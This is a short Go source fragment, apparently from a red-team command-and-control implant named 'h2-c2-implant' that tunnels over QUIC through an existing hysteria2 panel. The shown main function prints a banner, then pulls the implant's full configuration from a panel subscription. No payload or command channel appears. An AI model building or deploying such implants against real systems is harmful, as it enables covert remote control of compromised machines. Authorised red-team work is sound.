...
func main() {
	...
	if *version {
		fmt.Println("h2-c2-implant v0.1 — Red Team QUIC C2 | Riding your existing hysteria2 panel")
		os.Exit(0)
	}

	fmt.Printf("[+] h2-c2-implant starting on %s/%s\n", runtime.GOOS, runtime.GOARCH)

	cfg := config.LoadBootstrap()
	if err := config.FetchFullConfigFromSubscription(cfg); err != nil {
		fmt.Printf("[-] Failed to bootstrap from panel subscription: %v\n", err)
		os.Exit(1)
	}
